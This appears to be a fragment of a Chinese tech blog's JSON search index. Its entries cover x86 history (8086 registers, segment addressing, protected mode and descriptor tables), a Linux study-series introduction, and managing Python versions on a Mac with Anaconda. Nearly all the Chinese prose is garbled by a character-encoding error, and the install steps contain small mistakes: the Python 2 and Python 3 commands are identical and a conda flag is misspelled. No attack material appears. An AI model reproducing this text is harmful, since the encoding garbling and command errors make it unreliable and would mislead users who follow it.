","date":"2020-07-25","objectID":"/2020/07/x86/:2:4","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"ä¸‰ã€8086çš„åŸç† x86ä¸­æœ€ç»å…¸çš„ä¸€æ¬¾å¤„ç†å™¨å°±æ˜¯8086å¤„ç†å™¨ï¼Œè‡³ä»Šä¸ºæ­¢å¾ˆå¤šæ“ä½œç³»ç»Ÿä»ç„¶ä¿æŒå¯¹è¯¥å¤„ç†å™¨çš„å…¼å®¹æ€§ã€‚ ä¸‹å›¾ä¸ºCPUå†…éƒ¨ç»„ä»¶æ„æˆå›¾ï¼š æ•°æ®å•å…ƒï¼ŒåŒ…å«8ä¸ª16ä½çš„å¯„å­˜å™¨ï¼šAXã€BXã€CXã€DXã€SPã€BPã€SIã€DIã€‚å…¶ä¸­ï¼ŒAXã€BXã€CXã€DXå¯ä»¥æ‹†åˆ†æˆ2ä¸ª8ä½çš„å¯„å­˜å™¨ä½¿ç”¨ï¼šAHã€ALã€BHã€BLã€CHã€CLã€DHã€DLã€‚Hä»£è¡¨Highï¼Œè¡¨ç¤ºé«˜ä½ï¼ŒLä»£è¡¨Lowï¼Œè¡¨ç¤ºåœ°ä½ã€‚è¿™æ ·ä»¥æ¥ï¼Œé•¿æ•°æ®å¯ä»¥ç›´æ¥ä½¿ç”¨å®Œæ•´çš„å¯„å­˜å™¨ï¼Œè€ŒçŸ­æ•°æ®ä¹Ÿå¯ä»¥å¦¥å–„å¤„ç†ã€‚ æ§åˆ¶å•å…ƒï¼ŒIPï¼ˆInstruction Pointer Registerï¼‰å¯„å­˜å™¨å³æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼Œç”¨äºç¡®å®šä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚CPUæ ¹æ®è¯¥å¯„å­˜å™¨ä¸æ–­å°†æŒ‡ä»¤ä»å†…å­˜çš„ä»£ç æ®µä¸­åŠ è½½åˆ°æŒ‡ä»¤é˜Ÿåˆ—é‡Œï¼Œç„¶åäº¤ç»™è¿ç®—å•å…ƒæ‰§è¡Œã€‚4ä¸ªæ®µå¯„å­˜å™¨ï¼ŒCSã€DSã€SSã€ESå¯„å­˜å™¨ï¼Œåˆ™ç”¨äºè¿›ç¨‹åˆ‡æ¢ä¸­ã€‚CSæŒ‡ä»£ç æ®µå¯„å­˜å™¨ï¼ˆCode Segment Registerï¼‰ï¼Œé€šè¿‡å®ƒå¯ä»¥æ‰¾åˆ°ä»£ç åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼›DSæ˜¯æ•°æ®æ®µå¯„å­˜å™¨ï¼Œé€šè¿‡å®ƒå¯ä»¥æ‰¾åˆ°æ•°æ®åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚SSæ˜¯æ ˆå¯„å­˜å™¨ï¼ˆStack Segment Registerï¼‰ï¼Œä¸€èˆ¬å­˜æ”¾å †æ ˆæ®µçš„é¦–åœ°å€ï¼Œé…åˆSPæˆ–BPä½¿ç”¨ï¼ŒESæ˜¯é™„åŠ æ®µå¯„å­˜å™¨ï¼ˆExtra Segmentï¼‰ã€‚å½“å‰é¢çš„æ®µå¯„å­˜å™¨ä¸å¤Ÿç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ESå¯„å­˜å™¨ã€‚ è¿›è¡Œè¿ç®—æ—¶å¦‚ä½•åŠ è½½å†…å­˜ä¸­çš„æ•°æ®å‘¢ï¼Ÿ é€šè¿‡DSç¡®å®šæ•°æ®æ®µåœ°å€ é€šè¿‡å¯„å­˜å™¨ç¡®å®šåç§»é‡ï¼ˆOffsetï¼‰ï¼Œç¡®å®šå¾…ç”¨æ•°æ®åœ¨æ®µä¸­çš„åç§»ï¼ˆä»£ç æ®µçš„åç§»é‡ä¼šå­˜æ”¾åœ¨IPå¯„å­˜å™¨ï¼Œæ•°æ®æ®µçš„åç§»é‡å­˜æ”¾åœ¨é€šç”¨å¯„å­˜å™¨ä¸­ï¼‰ é€šè¿‡\"èµ·å§‹åœ°å€ * 16 + åç§»é‡\"ç¡®å®šæœ€ç»ˆåœ°å€ è¿™é‡Œéœ€è¦æ³¨æ„ï¼ŒCSå’ŒDSå‡ä¸º16ä½ï¼ŒIPä¹Ÿæ˜¯16ä½ï¼Œå³èµ·å§‹åœ°å€å’Œåç§»é‡éƒ½æ˜¯16ä½ï¼Œä½†æ˜¯8086çš„åœ°å€æ€»çº¿æ—¶20ä½ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡ä¸Šé¢çš„å…¬å¼è®¡ç®—å‡ºæœ€ç»ˆçš„æ•°æ®åœ°å€ã€‚ æ ¹æ®åœ°å€æ€»çº¿é•¿åº¦ï¼Œ8086çš„æœ€å¤§å¯»å€èƒ½åŠ›ä¸º1Mã€‚ä¸”å› ä¸ºåç§»é‡ä¸º16ä½ï¼Œæ‰€ä»¥ä¸€ä¸ªæ®µçš„æœ€å¤§çš„å¤§å°ä¸º2^16=64Kã€‚ ","date":"2020-07-25","objectID":"/2020/07/x86/:3:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"å››ã€32ä½å¤„ç†å™¨ æ ¸å¿ƒå°±æ˜¯æ‰©å±•æ€»çº¿ä½å®½ï¼Œæ‰©å¤§å†…å­˜ã€‚åœ°å€æ€»çº¿å˜ä¸º32æ ¹ï¼Œå¯»å€èƒ½åŠ›è¾¾åˆ°2^32=4Gã€‚å¦‚ä½•ä½¿å¾—ç¡¬ä»¶ä¿æŒå…¼å®¹å‘¢ï¼Ÿ é¦–å…ˆï¼Œæ‰©å±•é€šç”¨å¯„å­˜å™¨ï¼Œå°†8ä¸ª16ä½å¯„å­˜å™¨æ‰©å±•ä¸º32ä½ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥ä¿ç•™16ä½å’Œ8ä½çš„ä½¿ç”¨æ–¹å¼ï¼ˆ8ä½çš„ä½¿ç”¨åªèƒ½åœ¨ä½ä½ï¼Œå¦‚æœé«˜ä½ä¹Ÿåˆ‡å‰²ï¼Œå°±ä¼šä¸å…¼å®¹ï¼‰ã€‚IPå¯„å­˜å™¨æ‰©å±•æˆ32ä½ï¼ŒåŒæ—¶å…¼å®¹16ä½ã€‚æœ¬è´¨ä¸Šï¼Œæ€æƒ³è·Ÿ8086çš„æ€æƒ³æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯ç¡¬ä»¶åšäº†å‡çº§ã€‚ å›é¡¾ä¸€ä¸‹8086çš„å¯»å€æ–¹å¼ï¼Œ20ä½åœ°å€çš„ä½¿ç”¨å…¶å®æ˜¯æœ‰ç‚¹å°´å°¬çš„ï¼Œç»“æœè¿˜å¯¼è‡´å¿…é¡»ä½¿ç”¨â€œèµ·å§‹åœ°å€ * 16 + åç§»é‡â€çš„æ–¹å¼æ¥è®¡ç®—å®é™…åœ°å€ã€‚å¦‚æœå¯„å­˜å™¨å…¨éƒ¨å˜æˆ32ä½ï¼Œ4Gçš„å†…å­˜ç©ºé—´éƒ½å¯ä»¥è®¿é—®åˆ°ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥çœå»è®¡ç®—å…¬å¼å‘¢ï¼Ÿ åœ¨32ä½å¯„å­˜å™¨çš„ç³»ç»Ÿä¸­ï¼ŒCSã€DSã€SSã€ESä»ç„¶ä¸º16ä½ï¼Œä½†ä¸å†æ˜¯æ®µçš„èµ·å§‹åœ°å€ã€‚æ®µçš„èµ·å§‹åœ°å€æ”¾åœ¨å†…å­˜çš„æŸä¸ªåœ°æ–¹ï¼Œè¿™ä¸ªåœ°æ–¹æ˜¯ä¸€ä¸ªè¡¨æ ¼ï¼Œè¡¨æ ¼ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ªæ®µæè¿°ç¬¦ï¼ˆSegment Descriptorï¼‰ï¼Œæ®µæè¿°ç¬¦ä¸­æ”¾çš„æ‰æ˜¯çœŸæ­£çš„æ®µçš„èµ·å§‹åœ°å€ã€‚è€Œæ®µå¯„å­˜å™¨åˆ™å­˜æ”¾å…·ä½“æ˜¯è¡¨æ ¼ä¸­çš„å“ªä¸€é¡¹ï¼Œç§°ä¸ºé€‰æ‹©å­ï¼ˆSelectorï¼‰ã€‚è¿™æ ·ï¼Œå°±å°†ä»ä¸€ä¸ªæ®µå¯„å­˜å™¨ç›´æ¥è·å–æ®µçš„èµ·å§‹åœ°å€ï¼Œå˜æˆå…ˆé—´æ¥åœ°ä»æ®µå¯„å­˜å™¨åçš„è¡¨æ ¼ä¸­çš„ä¸€é¡¹ï¼Œç„¶åä»è¡¨æ ¼çš„ä¸€é¡¹ä¸­åå»çœŸæ­£çš„æ®µèµ·å§‹åœ°å€ã€‚å®é™…ä¸Šä¸ºäº†å¿«é€Ÿæ‹¿åˆ°æ®µèµ·å§‹åœ°å€ï¼Œæ®µå¯„å­˜å™¨ä¼šä»å†…å­˜ä¸­æ‹¿åˆ°CPUçš„æè¿°ç¬¦é«˜é€Ÿç¼“å­˜å™¨ä¸­ã€‚ï¼ˆè¿™ä¸ªä¿å­˜å„ä¸ªæ®µçš„èµ·å§‹åœ°å€çš„è¡¨æ ¼å…¶å®æ˜¯GDTï¼ˆGlobal Descriptor Tableï¼Œå…¨å±€æè¿°ç¬¦è¡¨ï¼‰å’ŒLDTï¼ˆLocal Descriptor Tableï¼Œå±€éƒ¨æè¿°ç¬¦è¡¨ï¼‰ï¼‰ 32ä½è¿™ç§è®¾è®¡æ–¹æ¡ˆçš„æ€æƒ³å¾ˆå€¼å¾—å¤§å®¶å¥½å¥½ç¢ç£¨ï¼Œå•çº¯åœ°å¯»å€æ€»æ˜¯è¦æ¯”è®¡ç®—+å¯»å€åœ°é€Ÿåº¦å¿«çš„ã€‚ä¸ªäººè®¤ä¸ºï¼Œè¿™ç§æ–¹æ¡ˆå¯ä»¥è¯´çº æ­£äº†20ä½åœ°å€æ€»çº¿çš„ä¸€ç§æŠ€æœ¯è½åå¯¼è‡´çš„è®¾è®¡é”™è¯¯ï¼Œè€Œä¸”è¿™ç§æ–¹æ¡ˆè¿œè¿œæ¯”20ä½çš„æ›´çµæ´»ã€‚ ä½†æ˜¯è¿™æ ·ä¼šå¯¼è‡´ä¸å…¼å®¹é—®é¢˜çš„å‡ºç°ï¼Œæ€ä¹ˆåŠï¼Ÿå¤§çš„å°çš„æˆ‘éƒ½è¦ã€‚ 32ä½æ¶æ„ä¸‹ï¼Œå‡ºç°äº†å®æ¨¡å¼ï¼ˆReal Patternï¼‰å’Œä¿æŠ¤æ¨¡å¼ï¼ˆProtect Patternï¼‰ã€‚å®æ¨¡å¼å°±æ˜¯å‰é¢çš„è¿è¡Œæ¨¡å¼ï¼Œä¿æŠ¤æ¨¡å¼å°±æ˜¯åé¢çš„è¿è¡Œæ¨¡å¼ã€‚åœ¨ç³»ç»Ÿåˆšå¯åŠ¨æ—¶ï¼Œè¿è¡Œåœ¨å®æ¨¡å¼ï¼Œè¿è¡ŒæˆåŠŸåå˜ä¸ºä¿æŠ¤æ¨¡å¼ã€‚è¿™å…¶å®æ˜¯ä¸€ç§é€šè¿‡åˆ‡æ¢æ¨¡å¼å®ç°å…¼å®¹çš„æ–¹æ¡ˆã€‚å¯è§æŠ€æœ¯çš„å‘å±•ï¼Œä¹Ÿå½±å“ç€äººçš„æ€æƒ³çš„å‘å±•ã€‚ ","date":"2020-07-25","objectID":"/2020/07/x86/:4:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"äº”ã€å‚è€ƒ ä¸“æ  â€“ ã€Šè¶£è°ˆLinuxæ“ä½œç³»ç»Ÿã€‹ ","date":"2020-07-25","objectID":"/2020/07/x86/:5:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- OSâ€”â€”x86æ¶æ„","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- ç»¼è¿°","date":"2020-07-24","objectID":"/2020/07/description/","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- ç»¼è¿°","uri":"/2020/07/description/"},{"categories":["Linux"],"content":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ â€“ ç»¼è¿° Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ â€“ ç»¼è¿° ","date":"2020-07-24","objectID":"/2020/07/description/:0:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- ç»¼è¿°","uri":"/2020/07/description/"},{"categories":["Linux"],"content":"å‰è¨€ Linuxæ“ä½œç³»ç»Ÿï¼Œç›®å‰æœåŠ¡å™¨é¢†åŸŸä½“é‡æœ€å¤§çš„æ“ä½œç³»ç»Ÿã€‚ä¹‹å‰å­¦ä¹ æ“ä½œç³»ç»Ÿæ—¶ï¼Œå¹¶æœªå•ç‹¬å¯¹Linuxæ“ä½œç³»ç»Ÿè¿›è¡Œæ·±å…¥çš„å­¦ä¹ å’Œç†è§£ï¼Œä»…ä»…åœç•™åœ¨å¸¸è§„ä½¿ç”¨å’Œè¿ç»´å±‚é¢ï¼Œè€Œä¸”åªåœ¨éœ€è¦æ—¶å¯¹éƒ¨åˆ†åŠŸèƒ½å’Œè¿‡ç¨‹è¿›è¡Œäº†æ·±å…¥çš„æ¢ç´¢ã€‚åœ¨å­¦ä¹ ç¼–ç¨‹æ—¶ï¼Œä¹Ÿå¹¶æ²¡æœ‰å°†Linuxå½“ä½œç¼–ç¨‹ä¸»åŠ›ï¼Œå½“æ—¶è¿˜ä¸»è¦æ˜¯åœ¨åšWindowså¹³å°ä¸‹çš„å¼€å‘ï¼Œå› æ­¤å¯¹äºUnixå¹³å°å’Œç±»å¹³å°çš„ç¼–ç¨‹å¼€å‘èƒ½åŠ›ç›¸å¯¹è¾ƒå¼±ã€‚åŸºäºä»¥ä¸Šä¸¤ç‚¹ï¼Œæˆ‘è§‰å¾—ä»å¤´å†å®Œæ•´è¿‡ä¸€éLinuxï¼Œå°†Linuxç›¸å…³å†…å®¹æ•´ç†æˆå®Œæ•´çš„çŸ¥è¯†ä½“ç³»æ¶æ„ã€‚ å­¦ä¹ è¿‡ç¨‹ä¸­æˆ‘ä¼šç®€å•è®°å½•ä¸­é—´é‡åˆ°çš„é‡ç‚¹å’Œé—®é¢˜ï¼Œè¿™äº›é—®é¢˜å¯èƒ½éœ€è¦ä¸€å®šçš„åŸºç¡€æ‰èƒ½ç†è§£ï¼Œæœ¬ç³»åˆ—éƒ¨åˆ†å†…å®¹å¯èƒ½å¯¹äºæ–°æ‰‹å¹¶ä¸å‹å¥½ï¼ˆä»…ä»…æ˜¯éƒ¨åˆ†å†…å®¹ï¼Œç›¸ä¿¡å¤§éƒ¨åˆ†å¤§å®¶è¿˜æ˜¯éƒ½èƒ½çœ‹æ‡‚çš„ï¼‰ã€‚ ","date":"2020-07-24","objectID":"/2020/07/description/:1:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- ç»¼è¿°","uri":"/2020/07/description/"},{"categories":["Linux"],"content":"å†…å®¹åˆ’åˆ† ç›®å‰è®¡åˆ’å°†Linuxç›¸å…³å†…å®¹æ•´ä½“ä¸Šåˆ’åˆ†ä¸ºä¸¤éƒ¨åˆ† â€“ æ“ä½œç³»ç»Ÿå’ŒUnixç¼–ç¨‹ï¼ˆä»¥Linuxä¸ºå¼€å‘å¹³å°ï¼‰ï¼Œåç»­å¦‚æœæ—¶é—´å’Œç²¾åŠ›å…è®¸çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šæ›´æ–°éƒ¨åˆ†Linuxå®‰å…¨ç›¸å…³çš„å†…å®¹ â€“ æ¼æ´ï¼ˆååˆ†æï¼‰å’Œæ”»é˜²ï¼ˆåæŠ€å·§ï¼‰ã€‚ æ“ä½œç³»ç»Ÿéƒ¨åˆ†ä¼šå¤§è‡´æŒ‰ç…§å¸¸è§„æ“ä½œç³»ç»Ÿçš„è¯¾ç¨‹æ¥å®‰æ’å†…å®¹ï¼Œä¸­é—´ä¼šå‚è€ƒéƒ¨åˆ†å…¬å¼€è¯¾å’Œå„ç§ä¹¦ç±ã€åšå®¢ç­‰ï¼Œå‡ä¼šç»™å‡ºç›¸å…³é“¾æ¥å’Œå¼•ç”¨è¯´æ˜ï¼Œæ–¹ä¾¿å¤§å®¶æ›´å¥½åœ°æ‰¾åˆ°èµ„æºã€‚ Unixç¼–ç¨‹éƒ¨åˆ†åˆ™ä¼šæŒ‰ç…§ã€ŠUnixç¯å¢ƒé«˜çº§ç¼–ç¨‹ï¼ˆç¬¬3ç‰ˆï¼‰ã€‹å’Œã€ŠUnixç½‘ç»œç¼–ç¨‹ã€‹æ¥å®‰æ’å†…å®¹ï¼Œä¸­é—´ä¼šå¯¹éƒ¨åˆ†å†…å®¹åšæ‰©å……ï¼Œä¹Ÿä¼šå¯¹ä¸€äº›åŸºç¡€çŸ¥è¯†åšè£å‰ªï¼Œäº‰å–åªä¿ç•™å¹²è´§å’Œç²¾åã€‚ æ¼æ´éƒ¨åˆ†æš‚æ—¶çš„ç¼–æ’è¿˜æ²¡ç¡®å®šï¼Œä¸»è¦æ‹…å¿ƒæ—¶é—´ç²¾åŠ›ä¸å¤Ÿï¼Œå‡ºç°è´¨é‡åä½çš„æƒ…å†µã€‚ä½†æ€»åŸåˆ™æ˜¯ä»¥æ¼æ´åˆ†æä¸ºä¸»ï¼Œæ¼æ´æŒ–æ˜ä¸ºè¡¥å……ã€‚æ¼æ´åˆ†æå°†ä¼šä»‹ç»è§„èŒƒåŒ–çš„æ¼æ´åˆ†ææµç¨‹ï¼Œæ¼æ´æŒ–æ˜éƒ¨åˆ†å°†ä»‹ç»è‡ªå·±å­¦ä¹ æ¼æ´æŒ–æ˜çš„è¿‡ç¨‹ã€‚ æ”»é˜²éƒ¨åˆ†æš‚æ—¶çš„ç¼–æ’ä¹Ÿæ²¡ç¡®å®šï¼Œæ€»åŸåˆ™æ˜¯ä»¥æ¸—é€å’Œæ¼æ´åˆ©ç”¨æŠ€å·§ä¸ºä¸»ï¼Œä¸»è¦æ˜¯åšå„ç§æŠ€å·§çš„æœé›†æ•´ç†ã€‚ ","date":"2020-07-24","objectID":"/2020/07/description/:2:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- ç»¼è¿°","uri":"/2020/07/description/"},{"categories":["Linux"],"content":"æ›´æ–°å‘¨æœŸ æ›´æ–°æ—¶é—´ä¸å®šï¼Œæ€»åŸåˆ™æ˜¯æ¯å‘¨è‡³å°‘æ›´æ–°ä¸€æ¬¡ï¼Œäº‰å–ä¸€å¹´å†…æ›´æ–°å®Œæ“ä½œç³»ç»Ÿéƒ¨åˆ†å’ŒUnixç¼–ç¨‹çš„1/2å†…å®¹ã€‚ æœ€åï¼Œé™„ä¸Šè‡ªå·±å–œæ¬¢çš„ä¸€å¥è¯ï¼šäººä¸–çº·ä¹±ï¼Œå‡ºå…¥å¹³å®‰ã€‚ ","date":"2020-07-24","objectID":"/2020/07/description/:3:0","tags":["Linux"],"title":"Linuxæ“ä½œç³»ç»Ÿçš„å¤§åƒä¸–ç•Œ -- ç»¼è¿°","uri":"/2020/07/description/"},{"categories":["Misc"],"content":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","date":"2020-02-24","objectID":"/2020/02/anaconda3/","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ Macå¹³å°ä¸‹å¤šç‰ˆæœ¬Pythonçš„ç®¡ç†å®è·µ ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:0:0","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"å‰è¨€ Macç³»ç»Ÿè‡ªå¸¦ä¸€ä¸ªPython2ï¼Œä½†æ˜¯åœ¨å®é™…ç”Ÿäº§æ—¶ç°åœ¨è¶Šæ¥è¶Šå¤šä½¿ç”¨Python3ã€‚å¦‚æœç›´æ¥åœ¨ç³»ç»Ÿä¸Šæ·»åŠ ä¸€ä¸ªPython3ï¼Œéå¸¸ä¸æ–¹ä¾¿è¿›è¡Œç®¡ç†ã€‚åœ¨è¿›è¡Œå¼€å‘æ—¶ï¼Œä¹Ÿéœ€è¦è¿›è¡Œç›¸å…³é…ç½®æ‰èƒ½æ˜ç¡®ä½¿ç”¨çš„Pythonç‰ˆæœ¬ã€‚ç»è¿‡å¤šæ–¹å¼ã€å¤šè½¯ä»¶å°è¯•ï¼Œæœ€ç»ˆæ‰¾åˆ°ä¸€ç§æ–¹ä¾¿çš„Pythonç‰ˆæœ¬ç®¡ç†æ–¹å¼ã€‚ ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:1:0","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"ä¸€ã€ç¯å¢ƒè¯´æ˜ é¦–å…ˆç³»ç»Ÿè‡ªå¸¦ä¸€ä¸ªPython2ï¼Œç„¶åä½¿ç”¨HomeBrewå®‰è£…äº†ä¸€ä¸ªPython3ã€‚ä¸ºäº†ä¸å½±å“ç³»ç»Ÿçš„Python2çš„ï¼Œéœ€è¦å†ä¸ªäººå®‰è£…ä¸€ä¸ªPython2å’ŒPython3ã€‚ ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:2:0","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"äºŒã€Anaconda3 ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:3:0","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"1. é€‰æ‹©ç†ç”± èµ·åˆå°è¯•è¿‡Pyenvï¼Œæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œæ”¾å¼ƒäº†ã€‚å°è¯•äº†ç›®å‰ç½‘ç»œä¸Šèƒ½æ‰¾åˆ°çš„æ‰€æœ‰çš„ç‰ˆæœ¬ç®¡ç†æ–¹å¼ï¼Œæœ€ç»ˆé€‰æ‹©äº†Anacondaè¿›è¡Œç®¡ç†ã€‚ ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:3:1","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"2. å®‰è£… 1. HomeBrewå®‰è£… ä¸ä½¿ç”¨å›¾å½¢åŒ–ç®¡ç†ç•Œé¢ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨HomeBrewè¿›è¡Œå®‰è£…ã€‚ Terminalè¾“å…¥ï¼š # æŸ¥çœ‹anacondaçš„ä½ç½® brew search anaconda è¿›è¡Œå®‰è£…ï¼š brew install anaconda ä»¥brew caskçš„æ–¹å¼å¼€å§‹è¿›è¡Œå®‰è£…ï¼Œå…ˆä¸‹è½½æ–‡ä»¶ï¼Œç„¶åè¿›è¡Œè¾“å…¥æœ¬æœºå¯†ç å°±å¯ä»¥å¼€å§‹è¿›è¡Œå®‰è£…ã€‚ å®‰è£…å®Œæˆåçš„ç¯å¢ƒé…ç½®ï¼š #ä½¿ç”¨bash echo 'export PATH=/usr/local/anaconda3/bin:$PATH' \u003e\u003e ~/.bash_profile source ~/.bash_profile #ä½¿ç”¨zsh echo 'export PATH=/usr/local/anaconda3/bin:$PATH' \u003e\u003e ~/.zshrc source ~/.zshrc æ£€æŸ¥ï¼š conda --vesion å®‰è£…å®Œæˆã€‚ 2. å®˜ç½‘å®‰è£… å®˜ç½‘åœ°å€ï¼šAnaconda3 å¯ä»¥ä¸‹è½½å›¾å½¢å®‰è£…åŒ…ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½å‘½ä»¤è¡Œå®‰è£…æ–‡ä»¶ã€‚å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨å»ºè®®å…ˆå®‰è£…å›¾å½¢å®‰è£…åŒ…ï¼Œè¿™æ ·ä½ å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°æ¯ä¸ªpythonç¯å¢ƒé‡Œå®‰è£…äº†å“ªäº›åŒ…ã€‚ç†Ÿæ‚‰äº†æ“ä½œä¹‹åæ¢æˆå‘½ä»¤è¡Œå³å¯ã€‚ 1. å›¾å½¢åŒ–å®‰è£… å›¾å½¢å®‰è£…å®Œæˆåçš„ä¸»ç•Œé¢ï¼š è¿›å…¥åˆ°Environmentsé€‰é¡¹ä¸­å¯ä»¥æŸ¥çœ‹å·²å®‰è£…çš„ç›¸å…³ç¯å¢ƒçš„è¯¦ç»†ä¿¡æ¯ï¼š è¿™é‡Œanaconda3è‡ªå¸¦çš„ç¯å¢ƒåç§°ä¸ºbaseï¼ŒåŸºäºPython3ï¼Œè¯¥ç¯å¢ƒä¸­å®‰è£…äº†Pythonå¸¸ç”¨çš„å„ç§åŒ…ï¼Œå¦‚æœä¸æ˜¯å®šåˆ¶æ€§æœ‰æå¼ºçƒˆè¦æ±‚ï¼Œå¯ä»¥ä½¿ç”¨è¯¥ç¯å¢ƒï¼Œèƒ½æ»¡è¶³å¸¸è§çš„å„ç§å¼€å‘è¦æ±‚ï¼Œæ— éœ€å†è‡ªè¡Œé…ç½®å¼€å‘ç¯å¢ƒã€‚ 2. å‘½ä»¤è¡Œå®‰è£… å‘½ä»¤è¡Œå®‰è£…æ–¹å¼æ˜¯æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š Python2.7ï¼š $ bash ~/Downloads/Anaconda3-5.3.1-MacOSX-x86_64.sh //python2ç‰ˆæœ¬ Python3.7ï¼š $ bash ~/Downloads/Anaconda3-5.3.1-MacOSX-x86_64.sh //python3ç‰ˆæœ¬ åé¢è·¯å¾„ä¸ºå®‰è£…æ–‡ä»¶çš„ç›®å½•ã€‚ æç¤ºâ€œIn order to continue the installation process, please review the license agreement.â€ï¼Œç‚¹å‡»â€œEnterâ€æŸ¥çœ‹â€œè®¸å¯è¯åè®®â€ï¼›æ»šåŠ¨å±å¹•åˆ°æœ€ä¸‹æ–¹ï¼Œè¾“å…¥â€yes\"è¡¨ç¤ºåŒæ„åè®®ï¼Œå®‰è£…ç»§ç»­ã€‚ æç¤ºâ€œPress Enter to confirm the location, Press CTRL-C to cancel the installation or specify an alternate installation directory.â€,å¦‚æœæ¥å—é»˜è®¤å®‰è£…è·¯å¾„ï¼Œåˆ™æ˜¾ç¤ºâ€œPREFIX=/home//anaconda\u003c2 or 3\u003eâ€å¹¶ä¸”ç»§ç»­å®‰è£…ã€‚å®‰è£…è¿‡ç¨‹å¤§çº¦å‡ åˆ†é’Ÿã€‚å»ºè®®ç›´æ¥ä½¿ç”¨é»˜è®¤å®‰è£…è·¯å¾„ã€‚ æç¤ºâ€œDo you wish the installer to prepend the Anaconda install location to PATH in your /home//.bash_profile ?â€ï¼Œæ˜¯å¦è‡ªåŠ¨æ·»åŠ ç¯å¢ƒå˜é‡åˆ°.bash_profileæ–‡ä»¶ä¸­ï¼Œè¾“å…¥â€œyes\"ï¼Œè‡ªåŠ¨æ·»åŠ ï¼›è¾“å…¥â€no\"ï¼Œåˆ™éœ€è¦è‡ªè¡Œæ‰‹åŠ¨æ·»åŠ ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯zshï¼Œéœ€è¦åœ¨.zshrcæ–‡ä»¶ä¸­è‡ªè¡Œæ·»åŠ ç¯å¢ƒå˜é‡ã€‚ æç¤ºâ€Thank you for installing Anaconda!â€,å®‰è£…å®Œæˆã€‚ sourceä¸€ä¸‹æˆ–é‡å¯ç»ˆç«¯ä½¿æ–°åŠ çš„ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ source ~/.bash_profile # source ~/.zshrc ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:3:2","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"3. å¸è½½ ``` conda install anaconda-clean anaconda-clean #æ¸…é™¤ä¸ªäººé…ç½® rm -r /Users/XXXX/.anaconda_backup/... #åˆ é™¤å¤‡ä»½ï¼Œè·¯å¾„å¯èƒ½ä¸åŒ rm -rf /anaconda3 vi ~/.bash_profile #åˆ é™¤ç¯å¢ƒå˜é‡ # vi ~/.zshrc zshç”¨æˆ·æ‰§è¡Œè¿™ä¸€æ¡ rm -rf ~/.condarc ~/.conda 